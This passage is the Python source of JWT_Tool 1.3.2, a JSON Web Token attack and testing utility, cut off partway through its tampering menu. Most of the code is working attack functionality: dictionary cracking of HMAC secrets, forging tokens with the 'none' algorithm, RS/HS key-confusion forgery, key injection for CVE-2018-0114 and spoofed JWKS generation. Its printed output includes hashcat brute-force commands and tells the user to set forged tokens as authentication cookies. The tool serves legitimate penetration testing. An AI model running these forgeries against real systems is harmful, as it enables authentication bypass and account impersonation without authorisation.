#!/usr/bin/env python3
#
# JWT_Tool version 1.3.2 (23_11_2019)
# Written by ticarpi
# Please use responsibly...
# Software URL: https://github.com/ticarpi/jwt_tool
# Web: https://www.ticarpi.com
# Twitter: @ticarpi
#

import sys
import hashlib
import hmac
import base64
import json
import argparse
import datetime
from collections import OrderedDict
try:
    from Cryptodome.Signature import PKCS1_v1_5, DSS, pss
    from Cryptodome.Hash import SHA256, SHA384, SHA512
    from Cryptodome.PublicKey import RSA, ECC
except:
    print("WARNING: Cryptodome libraries not imported - these are needed for asymmetric crypto signing and verifying")
    print("On most Linux systems you can run the following command to install:")
    print("pip3 install pycryptodomex\n")

def checkSig(sig, contents, key):
    quiet = False
    if key == "":
        print("Type in the key to test")
        key = input("> ")
    testKey(key.encode(), sig, contents, headDict, quiet)

def checkSigKid(sig, contents):
    quiet = False
    print("\nLoading key file...")
    try:
        key1 = open(keyFile).read()
        print("File loaded: "+keyFile)
        testKey(key1.encode(), sig, contents, headDict, quiet)
    except:
        print("Could not load key file")
        exit(1)

def crackSig(sig, contents):
    quiet = True
    if headDict["alg"][0:2] != "HS":
        print("Algorithm is not HMAC-SHA - cannot test against passwords, try the Verify function.")
        return
    print("\nLoading key dictionary...")
    try:
        print("File loaded: "+keyList)
        keyLst = open(keyList, "r", encoding='utf-8', errors='ignore')
        nextKey = keyLst.readline()
    except:
        print("No dictionary file loaded")
        exit(1)
    print("Testing passwords in dictionary...")
    utf8errors = 0
    wordcount = 0
    while nextKey:
        wordcount += 1
        try:
            cracked = testKey(nextKey.strip().encode('UTF-8'), sig, contents, headDict, quiet)
        except:
            cracked = False
        if not cracked:
            if wordcount % 1000000 == 0:
                print("[*] Tested "+str(int(wordcount/1000000))+" million passwords so far")
            try:
                nextKey = keyLst.readline()
            except:
                utf8errors  += 1
                nextKey = keyLst.readline()
        else:
            return
    if cracked == False:
        print("\n[-] Key not in dictionary")
        print("\n===============================\nAs your list wasn't able to crack this token you might be better off using longer dictionaries, custom dictionaries, mangling rules, or brute force attacks.\nhashcat (https://hashcat.net/hashcat/) is ideal for this as it is highly optimised for speed. Just add your JWT to a text file, then use the following syntax to give you a good start:\n\n[*] dictionary attacks: hashcat -a 0 -m 16500 jwt.txt passlist.txt\n[*] rule-based attack:  hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule\n[*] brute-force attack: hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6\n===============================\n")
    if utf8errors > 0:
        print(utf8errors, " UTF-8 incompatible passwords skipped")

def testKey(key, sig, contents, headDict, quiet):
    if headDict["alg"] == "HS256":
        testSig = base64.urlsafe_b64encode(hmac.new(key,contents,hashlib.sha256).digest()).decode('UTF-8').strip("=")
    elif headDict["alg"] == "HS384":
        testSig = base64.urlsafe_b64encode(hmac.new(key,contents,hashlib.sha384).digest()).decode('UTF-8').strip("=")
    elif headDict["alg"] == "HS512":
        testSig = base64.urlsafe_b64encode(hmac.new(key,contents,hashlib.sha512).digest()).decode('UTF-8').strip("=")
    else:
        print("Algorithm is not HMAC-SHA - cannot test with this tool.")
        exit(1)
    if testSig == sig:
        cracked = True
        if len(key) > 25:
            print("\n[+] "+key[0:25].decode('UTF-8')+"...(output trimmed) is the CORRECT key!")
        else:
            print("\n[+] "+key.decode('UTF-8')+" is the CORRECT key!")
        return cracked
    else:
        cracked = False
        if quiet == False:
            if len(key) > 25:
                print("[-] "+key[0:25].decode('UTF-8')+"...(output trimmed) is not the correct key")
            else:
                print("[-] "+key.decode('UTF-8')+" is not the correct key")
        return cracked

def buildHead(alg, headDict):
    newHead = headDict
    newHead["alg"] = alg
    newHead = base64.urlsafe_b64encode(json.dumps(newHead,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    return newHead

def newRSAKeyPair():
    new_key = RSA.generate(2048, e=65537)
    pubKey = new_key.publickey().exportKey("PEM")
    privKey = new_key.exportKey("PEM")
    return pubKey, privKey

def newECKeyPair():
    new_key = ECC.generate(curve='P-256')
    pubKey = new_key.public_key().export_key(format="PEM")
    privKey = new_key.export_key(format="PEM")
    return pubKey, privKey

def signToken(headDict, paylDict, key, keyLength):
    newHead = headDict
    newHead["alg"] = "HS"+str(keyLength)
    if keyLength == 384:
        newContents = base64.urlsafe_b64encode(json.dumps(newHead,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
        newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha384).digest()).decode('UTF-8').strip("=")
        badSig = base64.b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha384).digest()).decode('UTF-8').strip("=")
    elif keyLength == 512:
        newContents = base64.urlsafe_b64encode(json.dumps(newHead,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
        newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha512).digest()).decode('UTF-8').strip("=")
        badSig = base64.b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha512).digest()).decode('UTF-8').strip("=")
    else:
        newContents = base64.urlsafe_b64encode(json.dumps(newHead,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
        newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha256).digest()).decode('UTF-8').strip("=")
        badSig = base64.b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha256).digest()).decode('UTF-8').strip("=")
    return newSig, badSig, newContents

def jwksGen(headDict, paylDict, jku, privateKey, kid="jwt_tool"):
    newHead = headDict
    nowtime = str(int(datetime.datetime.now().timestamp()))
    if privateKey:
        key = RSA.importKey(open(privateKey).read())
        pubKey = key.publickey().exportKey("PEM")
        privKey = key.export_key(format="PEM")
        new_key = RSA.importKey(pubKey)
        n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))
        e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))
        privKeyName = privateKey
    else:
        pubKey, privKey = newRSAKeyPair()
        new_key = RSA.importKey(pubKey)
        n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))
        e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))
        privKeyName = "private_jwttool_RSA_"+nowtime+".pem"
        with open(privKeyName, 'w') as test_priv_out:
            test_priv_out.write(privKey.decode())
    newjwks = {}
    newjwks["kty"] = "RSA"
    newjwks["kid"] = kid
    newjwks["use"] = "sig"
    newjwks["e"] = str(e.decode('UTF-8'))
    newjwks["n"] = str(n.decode('UTF-8').rstrip("="))
    newHead["jku"] = jku
    newHead["alg"] = "RS256"
    key = RSA.importKey(privKey)
    newContents = base64.urlsafe_b64encode(json.dumps(newHead,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    newContents = newContents.encode('UTF-8')
    h = SHA256.new(newContents)
    signer = PKCS1_v1_5.new(key)
    try:
        signature = signer.sign(h)
    except:
        print("Invalid Private Key")
        exit(1)
    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
    badSig = base64.b64encode(signature).decode('UTF-8').strip("=")
    jwksout = json.dumps(newjwks,separators=(",",":"), indent=4)
    jwksName = "jwks_jwttool_RSA_"+nowtime+".json"
    with open(jwksName, 'w') as test_jwks_out:
            test_jwks_out.write(jwksout)
    return newSig, badSig, newContents.decode('UTF-8'), jwksout, privKeyName, jwksName

def jwksEmbed(headDict, paylDict):
    newHead = headDict
    pubKey, privKey = newRSAKeyPair()
    new_key = RSA.importKey(pubKey)
    n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))
    e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))
    jwkbuild = {}
    jwkbuild["kty"] = "RSA"
    jwkbuild["kid"] = "jwt_tool"
    jwkbuild["use"] = "sig"
    jwkbuild["e"] = str(e.decode('UTF-8'))
    jwkbuild["n"] = str(n.decode('UTF-8').rstrip("="))
    newHead["jwk"] = jwkbuild
    newHead["alg"] = "RS256"
    key = RSA.importKey(privKey)
    newContents = base64.urlsafe_b64encode(json.dumps(newHead,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    newContents = newContents.encode('UTF-8')
    h = SHA256.new(newContents)
    signer = PKCS1_v1_5.new(key)
    try:
        signature = signer.sign(h)
    except:
        print("Invalid Private Key")
        exit(1)
    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
    badSig = base64.b64encode(signature).decode('UTF-8').strip("=")
    return newSig, badSig, newContents.decode('UTF-8')

def signTokenRSA(headDict, paylDict, privKey, keyLength):
    newHead = headDict
    newHead["alg"] = "RS"+str(keyLength)
    key = RSA.importKey(open(privKey).read())
    newContents = base64.urlsafe_b64encode(json.dumps(newHead,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    newContents = newContents.encode('UTF-8')
    if keyLength == 256:
        h = SHA256.new(newContents)
    elif keyLength == 384:
        h = SHA384.new(newContents)
    elif keyLength == 512:
        h = SHA512.new(newContents)
    else:
        print("Invalid RSA key length")
        exit(1)
    signer = PKCS1_v1_5.new(key)
    try:
        signature = signer.sign(h)
    except:
        print("Invalid Private Key")
        exit(1)
    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
    badSig = base64.b64encode(signature).decode('UTF-8').strip("=")
    return newSig, badSig, newContents.decode('UTF-8')

def signTokenEC(headDict, paylDict, privKey, keyLength):
    newHead = headDict
    newHead["alg"] = "ES"+str(keyLength)
    key = ECC.import_key(open(privKey).read())
    newContents = base64.urlsafe_b64encode(json.dumps(newHead,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    newContents = newContents.encode('UTF-8')
    if keyLength == 256:
        h = SHA256.new(newContents)
    elif keyLength == 384:
        h = SHA384.new(newContents)
    elif keyLength == 512:
        h = SHA512.new(newContents)
    else:
        print("Invalid RSA key length")
        exit(1)
    signer = DSS.new(key, 'fips-186-3')
    try:
        signature = signer.sign(h)
    except:
        print("Invalid Private Key")
        exit(1)
    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
    badSig = base64.b64encode(signature).decode('UTF-8').strip("=")
    return newSig, badSig, newContents.decode('UTF-8')

def signTokenPSS(headDict, paylDict, privKey, keyLength):
    newHead = headDict
    newHead["alg"] = "PS"+str(keyLength)
    key = RSA.importKey(open(privKey).read())
    newContents = base64.urlsafe_b64encode(json.dumps(newHead,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    newContents = newContents.encode('UTF-8')
    if keyLength == 256:
        h = SHA256.new(newContents)
    elif keyLength == 384:
        h = SHA384.new(newContents)
    elif keyLength == 512:
        h = SHA512.new(newContents)
    else:
        print("Invalid RSA key length")
        exit(1)
    try:
        signature = pss.new(key).sign(h)
    except:
        print("Invalid Private Key")
        exit(1)
    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
    badSig = base64.b64encode(signature).decode('UTF-8').strip("=")
    return newSig, badSig, newContents.decode('UTF-8')

def verifyTokenRSA(headDict, paylDict, sig, pubKey):
    key = RSA.importKey(open(pubKey).read())
    newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    newContents = newContents.encode('UTF-8')
    if "-" in sig:
        try:
            sig = base64.urlsafe_b64decode(sig)
        except:
            pass
        try:
            sig = base64.urlsafe_b64decode(sig+"=")
        except:
            pass
        try:
            sig = base64.urlsafe_b64decode(sig+"==")
        except:
            pass
    elif "+" in sig:
        try:
            sig = base64.b64decode(sig)
        except:
            pass
        try:
            sig = base64.b64decode(sig+"=")
        except:
            pass
        try:
            sig = base64.b64decode(sig+"==")
        except:
            pass
    else:
        print("Signature not Base64 encoded HEX")
    if headDict['alg'] == "RS256":
        h = SHA256.new(newContents)
    elif headDict['alg'] == "RS384":
        h = SHA384.new(newContents)
    elif headDict['alg'] == "RS512":
        h = SHA512.new(newContents)
    else:
        print("Invalid RSA algorithm")
    verifier = PKCS1_v1_5.new(key)
    try:
        valid = verifier.verify(h, sig)
        if valid:
            print("RSA Signature is VALID")
            valid = True
        else:
            print("RSA Signature is INVALID")
            valid = False
    except:
        print("The Public Key is invalid")
    return valid

def verifyTokenEC(headDict, paylDict, sig, pubKey):
    newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    message = newContents.encode('UTF-8')
    if "-" in str(sig):
        try:
            signature = base64.urlsafe_b64decode(sig)
        except:
            pass
        try:
            signature = base64.urlsafe_b64decode(sig+"=")
        except:
            pass
        try:
            signature = base64.urlsafe_b64decode(sig+"==")
        except:
            pass
    elif "+" in str(sig):
        try:
            signature = base64.b64decode(sig)
        except:
            pass
        try:
            signature = base64.b64decode(sig+"=")
        except:
            pass
        try:
            signature = base64.b64decode(sig+"==")
        except:
            pass
    else:
        print("Signature not Base64 encoded HEX")
    if headDict['alg'] == "ES256":
        h = SHA256.new(message)
    elif headDict['alg'] == "ES384":
        h = SHA384.new(message)
    elif headDict['alg'] == "ES512":
        h = SHA512.new(message)
    else:
        print("Invalid ECDSA algorithm")
    pubKey = open(pubKey, "r")
    pub_key = ECC.import_key(pubKey.read())
    verifier = DSS.new(pub_key, 'fips-186-3')
    try:
        verifier.verify(h, signature)
        print("ECC Signature is VALID")
        valid = True
    except:
        print("ECC Signature is INVALID")
        valid = False
    return valid

def verifyTokenPSS(headDict, paylDict, sig, pubKey):
    key = RSA.importKey(open(pubKey).read())
    newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    newContents = newContents.encode('UTF-8')
    if "-" in sig:
        try:
            sig = base64.urlsafe_b64decode(sig)
        except:
            pass
        try:
            sig = base64.urlsafe_b64decode(sig+"=")
        except:
            pass
        try:
            sig = base64.urlsafe_b64decode(sig+"==")
        except:
            pass
    elif "+" in sig:
        try:
            sig = base64.b64decode(sig)
        except:
            pass
        try:
            sig = base64.b64decode(sig+"=")
        except:
            pass
        try:
            sig = base64.b64decode(sig+"==")
        except:
            pass
    else:
        print("Signature not Base64 encoded HEX")
    if headDict['alg'] == "PS256":
        h = SHA256.new(newContents)
    elif headDict['alg'] == "PS384":
        h = SHA384.new(newContents)
    elif headDict['alg'] == "PS512":
        h = SHA512.new(newContents)
    else:
        print("Invalid RSA algorithm")
    verifier = pss.new(key)
    try:
        valid = verifier.verify(h, sig)
        print("RSA-PSS Signature is VALID")
        valid = True
    except:
        print("RSA-PSS Signature is INVALID")
        valid = False
    return valid

def parseJWKS(jwksfile):
    jwks = open(jwksfile, "r").read()
    jwksDict = json.loads(jwks, object_pairs_hook=OrderedDict)
    nowtime = int(datetime.datetime.now().timestamp())
    print("JWKS Contents:")
    try:
        keyLen = len(jwksDict["keys"])
        print("Number of keys: "+str(keyLen))
        i = -1
        for jkey in range(0,keyLen):
            i += 1
            print("\n--------")
            try:
                print("Key "+str(i+1))
                kid = str(jwksDict["keys"][i]["kid"])
                print("kid: "+kid)
            except:
                kid = i
                print("Key "+str(i+1))
            for keyVal in jwksDict["keys"][i].items():
                keyVal = keyVal[0]
                print("[+] "+keyVal+" = "+str(jwksDict["keys"][i][keyVal]))
            try:
                x = str(jwksDict["keys"][i]["x"])
                y = str(jwksDict["keys"][i]["y"])
                print("\nFound ECC key factors, generating a public key")
                pubKeyName = genECPubFromJWKS(x, y, kid, nowtime)
                print("[+] "+pubKeyName)
                print("\nAttempting to verify token using "+pubKeyName)
                valid = verifyTokenEC(headDict, paylDict, sig, pubKeyName)
            except:
                pass
            try:
                n = str(jwksDict["keys"][i]["n"])
                e = str(jwksDict["keys"][i]["e"])
                print("\nFound RSA key factors, generating a public key")
                pubKeyName = genRSAPubFromJWKS(n, e, kid, nowtime)
                print("[+] "+pubKeyName)
                print("\nAttempting to verify token using "+pubKeyName)
                valid = verifyTokenRSA(headDict, paylDict, sig, pubKeyName)
            except:
                pass
    except:
        print("Single key file")
        for jkey in jwksDict:
            print("[+] "+jkey+" = "+str(jwksDict[jkey]))
        try:
            kid = 1
            x = str(jwksDict["x"])
            y = str(jwksDict["y"])
            print("\nFound ECC key factors, generating a public key")
            pubKeyName = genECPubFromJWKS(x, y, kid, nowtime)
            print("[+] "+pubKeyName)
            print("\nAttempting to verify token using "+pubKeyName)
            valid = verifyTokenEC(headDict, paylDict, sig, pubKeyName)
        except:
            pass
        try:
            kid = 1
            n = str(jwksDict["n"])
            e = str(jwksDict["e"])
            print("\nFound RSA key factors, generating a public key")
            pubKeyName = genRSAPubFromJWKS(n, e, kid, nowtime)
            print("[+] "+pubKeyName)
            print("\nAttempting to verify token using "+pubKeyName)
            valid = verifyTokenRSA(headDict, paylDict, sig, pubKeyName)
        except:
            pass

def genECPubFromJWKS(x, y, kid, nowtime):
    try:
        x = int.from_bytes(base64.urlsafe_b64decode(x), byteorder='big')
    except:
        pass
    try:
        x = int.from_bytes(base64.urlsafe_b64decode(x+"="), byteorder='big')
    except:
        pass
    try:
        x = int.from_bytes(base64.urlsafe_b64decode(x+"=="), byteorder='big')
    except:
        pass
    try:
        y = int.from_bytes(base64.urlsafe_b64decode(y), byteorder='big')
    except:
        pass
    try:
        y = int.from_bytes(base64.urlsafe_b64decode(y+"="), byteorder='big')
    except:
        pass
    try:
        y = int.from_bytes(base64.urlsafe_b64decode(y+"=="), byteorder='big')
    except:
        pass
    new_key = ECC.construct(curve='P-256', point_x=x, point_y=y)
    pubKey = new_key.public_key().export_key(format="PEM")+"\n"
    pubKeyName = "kid_"+str(kid)+"_"+str(nowtime)+".pem"
    with open(pubKeyName, 'w') as test_pub_out:
        test_pub_out.write(pubKey)
    return pubKeyName

def genRSAPubFromJWKS(n, e, kid, nowtime):
    try:
        n = int.from_bytes(base64.urlsafe_b64decode(n), byteorder='big')
    except:
        pass
    try:
        n = int.from_bytes(base64.urlsafe_b64decode(n+"="), byteorder='big')
    except:
        pass
    try:
        n = int.from_bytes(base64.urlsafe_b64decode(n+"=="), byteorder='big')
    except:
        pass
    try:
        e = int.from_bytes(base64.urlsafe_b64decode(e), byteorder='big')
    except:
        pass
    try:
        e = int.from_bytes(base64.urlsafe_b64decode(e+"="), byteorder='big')
    except:
        pass
    try:
        e = int.from_bytes(base64.urlsafe_b64decode(e+"=="), byteorder='big')
    except:
        pass
    new_key = RSA.construct((n, e))
    pubKey = new_key.publickey().exportKey(format="PEM")
    pubKeyName = "kid_"+str(kid)+"_"+str(nowtime)+".pem"
    with open(pubKeyName, 'w') as test_pub_out:
        test_pub_out.write(pubKey.decode()+"\n")
    return pubKeyName

def checkAlgNone(headDict, tok2):
    print("\n====================================================================\nThis option attempts to use the \"none\" algorithm option in some \nimplementations of JWT so that the signature is stripped entirely \nand the token can be freely tampered with. \nIf successful you can use the Tamper options to forge whatever token \ncontent you like!\n====================================================================")
    print("\nGenerating alg-stripped tokens...")
    alg1 = "none"
    newHead1 = buildHead(alg1, headDict)
    CVEToken0 = newHead1+"."+tok2+"."
    alg = "None"
    newHead = buildHead(alg, headDict)
    CVEToken1 = newHead+"."+tok2+"."
    alg = "NONE"
    newHead = buildHead(alg, headDict)
    CVEToken2 = newHead+"."+tok2+"."
    alg = "nOnE"
    newHead = buildHead(alg, headDict)
    CVEToken3 = newHead+"."+tok2+"."
    print("\nSet this new token as the AUTH cookie, or session/local \nstorage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)")
    print("\n====================================================================\n")
    print("Your new forged token:")
    print("\"alg\": \"none\":\n"+CVEToken0)
    print("\n====================================================================\nSome variants, which may work on some JWT libraries:\n")
    print("\"alg\": \"None\":\n"+CVEToken1+"\n")
    print("\"alg\": \"NONE\":\n"+CVEToken2+"\n")
    print("\"alg\": \"nOnE\":\n"+CVEToken3)
    print("====================================================================")

def checkPubKey(headDict, tok2, pubKey):
    print("\n====================================================================\nThis option takes an available Public Key (the SSL certificate from \na webserver, for example?) and switches the RSA-signed \n(RS256/RS384/RS512) JWT that uses the Public Key as its 'secret'.\n====================================================================")
    try:
        key = open(pubKey).read()
        print("File loaded: "+pubKey)
    except:
        print("[-] File not found")
        exit(1)
    newHead = headDict
    newHead["alg"] = "HS256"
    newHead = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    newTok = newHead+"."+tok2
    newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newTok.encode(),hashlib.sha256).digest()).decode('UTF-8').strip("=")
    print("\nSet this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)")
    print("\n"+newTok+"."+newSig)

def tamperToken(paylDict, headDict, sig):
    print("\n====================================================================\nThis option allows you to tamper with the header, contents and \nsignature of the JWT.\n====================================================================")
    print("\nToken header values:")
    while True:
        i = 0
        headList = [0]
        for pair in headDict:
            menuNum = i+1
            if isinstance(headDict[pair], dict):
                print("["+str(menuNum)+"] "+pair+" = JSON object:")
                for subclaim in headDict[pair]:
                    print("    [+] "+subclaim+" = "+str(headDict[pair][subclaim]))
            else:
                print("["+str(menuNum)+"] "+pair+" = "+str(headDict[pair]))
            headList.append(pair)
            i += 1
        print("["+str(i+1)+"] *ADD A VALUE*")
        print("["+str(i+2)+"] *DELETE A VALUE*")
        print("[0] Continue to next step")
        selection = ""
        print("\nPlease select a field number:\n(or 0 to Continue)")
        try:
            selection = int(input("> "))
        except:
            print("Invalid selection")
            exit(1)
        if selection<len(headList) and selection>0:
            if isinstance(headDict[headList[selection]], dict):
                print("\nPlease select a sub-field number for the "+pair+" claim:\n(or 0 to Continue)")
                newVal = OrderedDict()
                for subclaim in headDict[headList[selection]]:
                    newVal[subclaim] = headDict[pair][subclaim]
                while True:
                    subList = [0]
                    s = 0
                    # for subclaim in headDict[headList[selection]]:
                    for subclaim in newVal:
                        subNum = s+1
                        print("["+str(subNum)+"] "+subclaim+" = "+str(newVal[subclaim]))
                        s += 1
                        subList.append(subclaim)
                    print("["+str(s+1)+"] *ADD A VALUE*")
                    print("["+str(s+2)+"] *DELETE A VALUE*")
                    print("[0] Continue to next step")
                    try:
                        subSel = int(input("> "))
                    except:
                        print("Invalid selection")
                        exit(1)
                    if subSel<=len(newVal) and subSel>0:
                        selClaim = subList[subSel]
                        print("\nCurrent value of "+selClaim+" is: "+str(newVal[selClaim]))
                        print("Please enter new value and hit ENTER")
                        newVal[selClaim] = input("> ")
                        print()
                    elif subSel == s+1:
                        print("Please enter new Key and hit ENTER")
                        newPair = input("> ")
                        print("Please enter new value for "+newPair+" and hit ENTER")
                        newVal[newPair] = input("> ")
                    elif subSel == s+2:
                        print("Please select a Key to DELETE and hit ENTER")
                        s = 0
                        for subclaim in newVal:
                            subNum = s+1
                            print("["+str(subNum)+"] "+subclaim+" = "+str(newVal[subclaim]))
                            subList.append(subclaim)
                            s += 1
                        try:
                            selSub = int(input("> "))
                        except:
                            print("Invalid selection")
                            exit(1)
                        delSub = subList[selSub]
                        del newVal[delSub]
                    elif subSel == 0:
                        print()
                        break
            else:
                print("\nCurrent value of "+headList[selection]+" is: "+str(headDict[headList[selection]]))
                print("Please enter new value and hit ENTER")
                newVal = input("> ")
            headDict[headList[selection]] = newVal
        elif selection == i+1:
            print("Please enter new Key and hit ENTER")
            newPair = input("> ")
            print("Please enter new value for "+newPair+" and hit ENTER")
            newVal = input("> ")
            headList.append(newPair)
            headDict[headList[selection]] = newVal
        elif selection == i+2:
            print("Please select a Key to DELETE and hit ENTER")
            i = 0
            for pair in headDict:
                menuNum = i+1
                print("["+str(menuNum)+"] "+pair+" = "+str(headDict[pair]))
                headList.append(pair)
                i += 1
            try:
                delPair = int(input("> "))
            except:
                print("Invalid selection")
                exit(1)
            del headDict[headList[delPair]]
        elif selection == 0:
            break
        else:
            exit(1)
    print("\nToken payload values:")
    while True:
        comparestamps, expiredtoken = dissectPayl(paylDict, count=True)
        i = 0
        paylList = [0]
        for pair in paylDict:
            menuNum = i+1
            paylList.append(pair)
            i += 1
        print("["+str(i+1)+"] *ADD A VALUE*")
        print("["+str(i+2)+"] *DELETE A VALUE*")
        if len(comparestamps) > 0:
            print("["+str(i+3)+"] *UPDATE TIMESTAMPS*")
        print("[0] Continue to next step")
        selection = ""
        print("\nPlease select a field number:\n(or 0 to Continue)")
        try:
            selection = int(input("> "))
        except:
            print("Invalid selection")
            exit(1)
        if selection<len(paylList) and selection>0:
            print("\nCurrent value of "+paylList[selection]+" is: "+str(paylDict[paylList[selection]]))
            print("Please enter new value and hit ENTER")
            newVal = input("> ")
            paylDict[paylList[selection]] = newVal
        elif selection == i+1:
            print("Please enter new Key and hit ENTER")
            newPair = input("> ")
            print("Please enter new value for "+newPair+" and hit ENTER")
            newVal = input("> ")
            try:
                newVal = int(newVal)
            except:
                pass
            paylList.append(newPair)
            paylDict[paylList[selection]] = newVal
        elif selection == i+2:
            print("Please select a Key to DELETE and hit ENTER")
            i = 0
            for pair in paylDict:
                menuNum = i+1
                print("["+str(menuNum)+"] "+pair+" = "+str(paylDict[pair]))
                paylList.append(pair)
                i += 1
            delPair = eval(input("> "))
            del paylDict[paylList[delPair]]
        elif selection == i+3:
            print("Timestamp updating:")
            print("[1] Update earliest timestamp to current time (keeping offsets)")
            print("[2] Add 1 hour to timestamps")
            print("[3] Add 1 day to timestamps")
            print("[4] Remove 1 hour from timestamps")
            print("[5] Remove 1 day from timestamps")
            print("\nPlease select an option from above (1-5):")
            try:
                selection = int(input("> "))
            except:
                print("Invalid selection")
                exit(1)
            if selection == 1:
                nowtime = int(datetime.datetime.now().timestamp())
                timecomp = {}
                for timestamp in comparestamps:
                    timecomp[timestamp] = paylDict[timestamp]
                earliest = min(timecomp, key=timecomp.get)
                earlytime = paylDict[earliest]
                for timestamp in comparestamps:
                    if timestamp == earliest:
                        paylDict[timestamp] = nowtime
                    else:
                        difftime = int(paylDict[timestamp])-int(earlytime)
                        paylDict[timestamp] = nowtime+difftime
            elif selection == 2:
                for timestamp in comparestamps:
                    newVal = int(paylDict[timestamp])+3600
                    paylDict[timestamp] = newVal
            elif selection == 3:
                for timestamp in comparestamps:
                    newVal = int(paylDict[timestamp])+86400
                    paylDict[timestamp] = newVal
            elif selection == 4:
                for timestamp in comparestamps:
                    newVal = int(paylDict[timestamp])-3600
                    paylDict[timestamp] = newVal
            elif selection == 5:
                for timestamp in comparestamps:
                    newVal = int(paylDict[timestamp])-86400
                    paylDict[timestamp] = newVal
            else:
                print("Invalid selection")
                exit(1)
        elif selection == 0:
            break
        else:
            exit(1)
    print("\nToken Signing:")
    print("[1] Sign token with known HMAC-SHA 'secret'")
    print("[2] Sign token with RSA/ECDSA Private Key")
    print("[3] Strip signature using the \"none\" algorithm")
    print("[4] Sign with HS/RSA key confusion vulnerability")
    print("[5] Sign token with key file")
    print("[6] Inject a key and self-sign the token (CVE-2018-0114)")
    print("[7] Self-sign the token and export an external JWKS")
    print("[8] Keep original signature")
    print("\nPlease select an option from above (1-5):")
    try:
        selection = int(input("> "))
    except:
        print("Invalid selection")
        exit(1)
    if selection == 1:
        print("\nPlease enter the known key:")
        key = input("> ")
        print("\nPlease enter the keylength:")
        print("[1] HMAC-SHA256")
        print("[2] HMAC-SHA384")
        print("[3] HMAC-SHA512")
        try:
            selLength = int(input("> "))
        except:
            print("Invalid selection")
            exit(1)
        if selLength == 1:
            keyLength = 256
        elif selLength == 2:
            keyLength = 384
        elif selLength == 3:
            keyLength = 512
        else:
            print("Invalid selection")
            exit(1)
        newSig, badSig, newContents = signToken(headDict, paylDict, key, keyLength)
        print("\nYour new forged token:")
        print("[+] URL safe: "+newContents+"."+newSig)
        print("[+] Standard: "+newContents+"."+badSig+"\n")
        exit(1)
    if selection == 2:
        print("\nPlease select an option:")
        print("[1] RSA key signing")
        print("[2] ECDSA key signing")
        print("[3] PSS key signing")
        try:
            selLength = int(input("> "))
        except:
            print("Invalid selection")
            exit(1)
        if selLength == 1:
            print("\nPlease select an option:")
            print("[1] Generate new RSA key pair")
            print("[2] Use existing RSA Private Key")
            try:
                selLength = int(input("> "))
            except:
                print("Invalid selection")
                exit(1)
            if selLength == 1:
                nowtime = str(int(datetime.datetime.now().timestamp()))
                pubKey, privKey = newRSAKeyPair()
                privKeyName = "private_jwttool_RSA_"+nowtime+".pem"
                pubKeyName = "public_jwttool_RSA_"+nowtime+".pem"
                with open(privKeyName, 'w') as test_priv_out:
                    test_priv_out.write(privKey.decode())
                with open(pubKeyName, 'w') as test_pub_out:
                    test_pub_out.write(pubKey.decode())
                print("\nKey pair created and exported as:\n"+pubKeyName+"\n"+privKeyName+"\n")
            elif selLength == 2:
